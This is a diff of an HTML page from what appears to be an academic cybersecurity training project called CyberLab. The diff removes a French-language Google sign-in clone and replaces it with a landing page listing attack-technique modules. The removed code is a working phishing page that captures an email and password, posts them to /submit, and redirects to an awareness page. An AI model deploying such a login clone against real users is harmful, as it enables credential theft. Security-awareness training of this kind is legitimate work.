@@ -3,477 +3,329 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Connexion – Comptes Google</title>
-  <link rel="icon" href="https://www.gstatic.com/favicon/favicon-32x32.png" type="image/png">
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
+  <title>CyberLab - Plateforme de Cybersecurite</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
-      font-family: 'Roboto', arial, sans-serif;
-      background-color: #f0f4f9;
+      font-family: 'Courier New', monospace;
+      background: #0a0a0a;
+      color: #e0e0e0;
       min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
     }
 
-    .container {
-      width: 100%;
-      max-width: 450px;
-      padding: 20px;
-    }
-
-    .card {
-      background: #fff;
-      border-radius: 28px;
-      padding: 48px 40px 36px;
-      border: 1px solid #dadce0;
+    /* --- Header --- */
+    .header {
+      text-align: center;
+      padding: 60px 20px 40px;
     }
 
     .logo {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 16px;
-    }
-
-    .logo-text {
-      font-family: 'Product Sans', 'Google Sans', arial, sans-serif;
-      font-size: 24px;
-      font-weight: 500;
-      letter-spacing: -0.5px;
-    }
-
-    .logo-text .blue { color: #4285F4; }
-    .logo-text .red { color: #EA4335; }
-    .logo-text .yellow { color: #FBBC05; }
-    .logo-text .green { color: #34A853; }
-
-    h1 {
-      font-family: 'Google Sans', 'Roboto', arial, sans-serif;
-      font-size: 24px;
-      font-weight: 400;
-      color: #202124;
-      text-align: center;
+      font-size: 48px;
+      font-weight: bold;
+      color: #00ff41;
       margin-bottom: 4px;
+      text-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
+      letter-spacing: 2px;
     }
 
-    .subtitle {
-      font-size: 16px;
-      color: #202124;
+    .logo span { color: #ff4444; }
+
+    .terminal-line {
+      color: #00ff41;
+      font-size: 14px;
+      opacity: 0.5;
+      margin-bottom: 12px;
+    }
+
+    .terminal-line .cursor {
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      0%, 50% { opacity: 1; }
+      51%, 100% { opacity: 0; }
+    }
+
+    .tagline {
+      color: #666;
+      font-size: 15px;
+      max-width: 600px;
+      margin: 0 auto;
+      line-height: 1.6;
+    }
+
+    /* --- Modules grid --- */
+    .modules-section {
+      max-width: 1000px;
+      margin: 0 auto;
+      padding: 0 20px 60px;
+    }
+
+    .section-title {
+      color: #555;
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      margin-bottom: 24px;
       text-align: center;
-      margin-bottom: 32px;
     }
 
-    /* Email chip (step 2) */
-    .email-chip {
-      display: none;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      margin: 0 auto 28px;
-      padding: 4px 12px 4px 4px;
-      border: 1px solid #dadce0;
-      border-radius: 16px;
-      width: fit-content;
-      cursor: pointer;
+    .modules-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
+      gap: 18px;
     }
 
-    .email-chip svg {
-      width: 22px;
-      height: 22px;
-      border-radius: 50%;
-    }
-
-    .email-chip span {
-      font-size: 14px;
-      color: #3c4043;
-    }
-
-    .email-chip .arrow {
-      width: 18px;
-      height: 18px;
-      fill: #5f6368;
-    }
-
-    /* Input fields */
-    .input-group {
-      position: relative;
-      margin-bottom: 4px;
-    }
-
-    .input-group input {
-      width: 100%;
-      padding: 13px 15px;
-      font-size: 16px;
-      font-family: 'Roboto', arial, sans-serif;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      outline: none;
-      color: #202124;
-      background: transparent;
-    }
-
-    .input-group input:focus {
-      border: 2px solid #1a73e8;
-      padding: 12px 14px;
-    }
-
-    .input-group label {
-      position: absolute;
-      left: 16px;
-      top: 14px;
-      font-size: 16px;
-      color: #5f6368;
-      pointer-events: none;
-      transition: all 0.15s ease;
-      background: #fff;
-      padding: 0 4px;
-    }
-
-    .input-group input:focus + label,
-    .input-group input:not(:placeholder-shown) + label {
-      top: -8px;
-      left: 12px;
-      font-size: 12px;
-      color: #1a73e8;
-    }
-
-    .input-group input:not(:focus):not(:placeholder-shown) + label {
-      color: #5f6368;
-    }
-
-    .input-error {
-      display: none;
-      align-items: center;
-      gap: 8px;
-      margin-top: 8px;
-      font-size: 12px;
-      color: #d93025;
-    }
-
-    .input-error svg {
-      width: 16px;
-      height: 16px;
-      fill: #d93025;
-      flex-shrink: 0;
-    }
-
-    /* Show password checkbox */
-    .show-password {
-      display: none;
-      align-items: center;
-      gap: 12px;
-      margin-top: 4px;
-      cursor: pointer;
-    }
-
-    .show-password input[type="checkbox"] {
-      width: 18px;
-      height: 18px;
-      accent-color: #1a73e8;
-      cursor: pointer;
-    }
-
-    .show-password span {
-      font-size: 14px;
-      color: #202124;
-      user-select: none;
-    }
-
-    /* Links */
-    .link {
-      display: inline-block;
-      margin-top: 12px;
-      font-size: 14px;
-      font-weight: 500;
-      color: #1a73e8;
+    .module-card {
+      background: #111;
+      border: 1px solid #222;
+      border-radius: 12px;
+      padding: 28px 24px;
       text-decoration: none;
-      cursor: pointer;
+      color: inherit;
+      transition: all 0.3s;
+      position: relative;
+      overflow: hidden;
     }
 
-    .link:hover {
-      background-color: #f6fafe;
+    .module-card.active:hover {
+      border-color: #00ff41;
+      transform: translateY(-3px);
+      box-shadow: 0 8px 30px rgba(0, 255, 65, 0.1);
+    }
+
+    .module-card.disabled {
+      opacity: 0.4;
+      cursor: default;
+    }
+
+    .module-card .card-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      margin-bottom: 14px;
+    }
+
+    .module-card .icon-wrapper {
+      width: 48px;
+      height: 48px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .module-card .icon-wrapper svg {
+      width: 26px;
+      height: 26px;
+    }
+
+    .module-card .status {
+      font-size: 10px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      padding: 3px 8px;
       border-radius: 4px;
-      padding: 2px 4px;
-      margin: 10px 0 -2px -4px;
+      font-weight: bold;
     }
 
-    /* Info text */
-    .info-text {
-      display: none;
-      font-size: 14px;
-      color: #5f6368;
-      margin-top: 24px;
+    .status.ready {
+      color: #00ff41;
+      background: rgba(0, 255, 65, 0.1);
+      border: 1px solid rgba(0, 255, 65, 0.2);
+    }
+
+    .status.soon {
+      color: #555;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid #222;
+    }
+
+    .module-card h2 {
+      font-size: 18px;
+      color: #e0e0e0;
+      margin-bottom: 8px;
+    }
+
+    .module-card.active:hover h2 { color: #00ff41; }
+
+    .module-card p {
+      color: #666;
+      font-size: 13px;
       line-height: 1.5;
     }
 
-    /* Bottom actions */
-    .actions {
+    .module-card .tags {
+      margin-top: 14px;
       display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-top: 32px;
+      gap: 8px;
+      flex-wrap: wrap;
     }
 
-    .actions .link {
-      margin-top: 0;
-    }
-
-    .btn-next {
-      background-color: #1a73e8;
-      color: #fff;
-      border: none;
+    .module-card .tag {
+      font-size: 11px;
+      color: #555;
+      background: #0a0a0a;
+      padding: 3px 10px;
       border-radius: 4px;
-      padding: 10px 24px;
-      font-size: 14px;
-      font-weight: 500;
-      font-family: 'Google Sans', 'Roboto', arial, sans-serif;
-      cursor: pointer;
-      letter-spacing: 0.25px;
+      border: 1px solid #1a1a1a;
     }
 
-    .btn-next:hover {
-      background-color: #1765cc;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.2);
-    }
-
-    /* Footer */
+    /* --- Footer --- */
     .footer {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-top: 28px;
-      padding: 0 4px;
+      text-align: center;
+      padding: 30px 20px;
+      border-top: 1px solid #111;
     }
 
-    .footer select {
-      border: none;
-      font-size: 13px;
-      color: #5f6368;
-      background: transparent;
-      cursor: pointer;
-      font-family: 'Roboto', arial, sans-serif;
+    .footer p {
+      color: #333;
+      font-size: 12px;
     }
 
-    .footer-links {
-      display: flex;
-      gap: 24px;
-    }
-
-    .footer-links a {
-      font-size: 13px;
-      color: #5f6368;
+    .footer a {
+      color: #444;
       text-decoration: none;
     }
 
-    /* Step transitions */
-    .step {
-      display: none;
-    }
+    .footer a:hover { color: #00ff41; }
 
-    .step.active {
-      display: block;
-      animation: fadeIn 0.3s ease;
-    }
+    /* --- Icon colors per module --- */
+    .icon-phishing { background: rgba(233, 69, 96, 0.1); }
+    .icon-phishing svg { fill: #e94560; }
+    .icon-sqli { background: rgba(0, 255, 65, 0.1); }
+    .icon-sqli svg { fill: #00ff41; }
+    .icon-keylogger { background: rgba(255, 170, 0, 0.1); }
+    .icon-keylogger svg { fill: #ffaa00; }
+    .icon-bruteforce { background: rgba(255, 68, 68, 0.1); }
+    .icon-bruteforce svg { fill: #ff4444; }
+    .icon-scanner { background: rgba(68, 170, 255, 0.1); }
+    .icon-scanner svg { fill: #44aaff; }
+    .icon-password { background: rgba(170, 68, 255, 0.1); }
+    .icon-password svg { fill: #aa44ff; }
 
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateX(30px); }
-      to { opacity: 1; transform: translateX(0); }
-    }
-
-    /* Loading */
-    .loading {
-      display: none;
-      justify-content: center;
-      padding: 20px 0;
-    }
-
-    .spinner {
-      width: 24px;
-      height: 24px;
-      border: 3px solid #dadce0;
-      border-top-color: #1a73e8;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    @media (max-width: 480px) {
-      .card {
-        padding: 36px 24px 24px;
-        border-radius: 20px;
-      }
+    @media (max-width: 600px) {
+      .logo { font-size: 34px; }
+      .header { padding: 40px 20px 30px; }
+      .modules-grid { grid-template-columns: 1fr; }
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="card">
-      <div class="logo">
-        <span class="logo-text">
-          <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
-        </span>
-      </div>
+  <div class="header">
+    <div class="logo">Cyber<span>Lab</span></div>
+    <div class="terminal-line">root@cyberlab:~$ ./load_modules<span class="cursor">_</span></div>
+    <p class="tagline">Plateforme educative de cybersecurite. Apprends les techniques d'attaque pour mieux te defendre.</p>
+  </div>
 
-      <!-- ÉTAPE 1 : Email -->
-      <div id="step-email" class="step active">
-        <h1>Connexion</h1>
-        <p class="subtitle">Utiliser votre compte Google</p>
+  <div class="modules-section">
+    <div class="section-title">Modules disponibles</div>
 
-        <div class="input-group">
-          <input type="text" id="email" placeholder=" " autocomplete="email" autofocus>
-          <label for="email">Adresse e-mail ou numéro de téléphone</label>
+    <div class="modules-grid">
+
+      <!-- Phishing -->
+      <a href="/phishing/" class="module-card active">
+        <div class="card-header">
+          <div class="icon-wrapper icon-phishing">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+          </div>
+          <span class="status ready">Actif</span>
         </div>
-        <div id="email-error" class="input-error">
-          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-          <span></span>
+        <h2>Phishing</h2>
+        <p>Clone de page de connexion Google. Capture d'identifiants et sensibilisation post-attaque.</p>
+        <div class="tags">
+          <span class="tag">Social Engineering</span>
+          <span class="tag">Credential Harvesting</span>
         </div>
+      </a>
 
-        <a class="link" href="#">Adresse e-mail oubliée ?</a>
-
-        <p class="info-text" style="display: block">
-          Vous n'utilisez pas votre propre ordinateur ? Utilisez le mode Invité pour vous connecter en privé.
-          <a href="#" style="color: #1a73e8; text-decoration: none; font-weight: 500;">En savoir plus sur l'utilisation du mode Invité</a>
-        </p>
-
-        <div class="actions">
-          <a class="link" href="#">Créer un compte</a>
-          <button class="btn-next" onclick="goToPassword()">Suivant</button>
+      <!-- SQL Injection -->
+      <a href="/sqli/" class="module-card active">
+        <div class="card-header">
+          <div class="icon-wrapper icon-sqli">
+            <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8h16v10zm-6-1h2v-2h-2v2zm-3-3h8v-2H9v2zm-4 0h2v-2H7v2zm0-3h10v-2H7v2z"/></svg>
+          </div>
+          <span class="status ready">Actif</span>
         </div>
-      </div>
-
-      <!-- ÉTAPE 2 : Mot de passe -->
-      <div id="step-password" class="step">
-        <h1>Bienvenue</h1>
-
-        <div class="email-chip" id="email-chip">
-          <svg viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
-          <span id="chip-email"></span>
-          <svg class="arrow" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+        <h2>SQL Injection</h2>
+        <p>Boutique vulnerable CyberShop. Mode guide avec 5 challenges progressifs ou mode libre.</p>
+        <div class="tags">
+          <span class="tag">UNION SELECT</span>
+          <span class="tag">Auth Bypass</span>
+          <span class="tag">OWASP #3</span>
         </div>
+      </a>
 
-        <div class="input-group">
-          <input type="password" id="password" placeholder=" " autocomplete="current-password">
-          <label for="password">Saisissez votre mot de passe</label>
+      <!-- Keylogger -->
+      <div class="module-card disabled">
+        <div class="card-header">
+          <div class="icon-wrapper icon-keylogger">
+            <svg viewBox="0 0 24 24"><path d="M20 5H4c-1.1 0-1.99.9-1.99 2L2 17c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-9 3h2v2h-2V8zm0 3h2v2h-2v-2zM8 8h2v2H8V8zm0 3h2v2H8v-2zm-1 2H5v-2h2v2zm0-3H5V8h2v2zm9 7H8v-2h8v2zm0-4h-2v-2h2v2zm0-3h-2V8h2v2zm3 3h-2v-2h2v2zm0-3h-2V8h2v2z"/></svg>
+          </div>
+          <span class="status soon">Bientot</span>
         </div>
-        <div id="password-error" class="input-error">
-          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-          <span></span>
-        </div>
-
-        <label class="show-password" style="display: flex">
-          <input type="checkbox" id="toggle-password" onchange="togglePassword()">
-          <span>Afficher le mot de passe</span>
-        </label>
-
-        <a class="link" href="#">Mot de passe oublié ?</a>
-
-        <div class="actions">
-          <span></span>
-          <button class="btn-next" onclick="submitCredentials()">Suivant</button>
+        <h2>Keylogger</h2>
+        <p>Keylogger JavaScript web-based avec affichage des frappes en temps reel.</p>
+        <div class="tags">
+          <span class="tag">JavaScript</span>
+          <span class="tag">Event Listeners</span>
         </div>
       </div>
 
-      <!-- Loading -->
-      <div id="loading" class="loading">
-        <div class="spinner"></div>
+      <!-- Brute Force -->
+      <div class="module-card disabled">
+        <div class="card-header">
+          <div class="icon-wrapper icon-bruteforce">
+            <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
+          </div>
+          <span class="status soon">Bientot</span>
+        </div>
+        <h2>Brute Force</h2>
+        <p>Test de mots de passe contre des hashs et formulaires volontairement vulnerables.</p>
+        <div class="tags">
+          <span class="tag">Dictionary Attack</span>
+          <span class="tag">Hash Cracking</span>
+        </div>
       </div>
-    </div>
 
-    <div class="footer">
-      <select>
-        <option>Français (France)</option>
-        <option>English (United States)</option>
-        <option>Español</option>
-        <option>Deutsch</option>
-      </select>
-      <div class="footer-links">
-        <a href="#">Aide</a>
-        <a href="#">Confidentialité</a>
-        <a href="#">Conditions</a>
+      <!-- Network Scanner -->
+      <div class="module-card disabled">
+        <div class="card-header">
+          <div class="icon-wrapper icon-scanner">
+            <svg viewBox="0 0 24 24"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
+          </div>
+          <span class="status soon">Bientot</span>
+        </div>
+        <h2>Network Scanner</h2>
+        <p>Mini nmap : scan de ports, detection de services et cartographie reseau.</p>
+        <div class="tags">
+          <span class="tag">Port Scanning</span>
+          <span class="tag">Reconnaissance</span>
+        </div>
       </div>
+
+      <!-- Password Analyzer -->
+      <div class="module-card disabled">
+        <div class="card-header">
+          <div class="icon-wrapper icon-password">
+            <svg viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
+          </div>
+          <span class="status soon">Bientot</span>
+        </div>
+        <h2>Password Analyzer</h2>
+        <p>Analyse de force de mot de passe et verification via l'API HaveIBeenPwned.</p>
+        <div class="tags">
+          <span class="tag">Entropy</span>
+          <span class="tag">HIBP API</span>
+        </div>
+      </div>
+
     </div>
   </div>
 
-  <script>
-    const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('password');
-    const emailError = document.getElementById('email-error');
-    const passwordError = document.getElementById('password-error');
-
-    function goToPassword() {
-      const email = emailInput.value.trim();
-
-      if (!email) {
-        emailError.style.display = 'flex';
-        emailError.querySelector('span').textContent = 'Saisissez une adresse e-mail ou un numéro de téléphone.';
-        emailInput.focus();
-        return;
-      }
-
-      emailError.style.display = 'none';
-
-      document.getElementById('step-email').classList.remove('active');
-      document.getElementById('step-password').classList.add('active');
-
-      document.getElementById('email-chip').style.display = 'flex';
-      document.getElementById('chip-email').textContent = email;
-
-      passwordInput.focus();
-    }
-
-    function togglePassword() {
-      const checkbox = document.getElementById('toggle-password');
-      passwordInput.type = checkbox.checked ? 'text' : 'password';
-    }
-
-    async function submitCredentials() {
-      const email = emailInput.value.trim();
-      const password = passwordInput.value;
-
-      if (!password) {
-        passwordError.style.display = 'flex';
-        passwordError.querySelector('span').textContent = 'Saisissez un mot de passe.';
-        passwordInput.focus();
-        return;
-      }
-
-      passwordError.style.display = 'none';
-
-      document.getElementById('step-password').classList.remove('active');
-      document.getElementById('loading').style.display = 'flex';
-
-      try {
-        await fetch('/submit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email, password })
-        });
-      } catch (e) {
-        // silently continue
-      }
-
-      setTimeout(() => {
-        window.location.href = '/awareness.html';
-      }, 1500);
-    }
-
-    // Allow Enter key
-    emailInput.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') goToPassword();
-    });
-
-    passwordInput.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') submitCredentials();
-    });
-  </script>
+  <div class="footer">
+    <p>CyberLab &mdash; Projet academique de cybersecurite &mdash; <a href="https://github.com/D-Arslan/Cyberlab">GitHub</a></p>
+  </div>
 </body>
 </html>
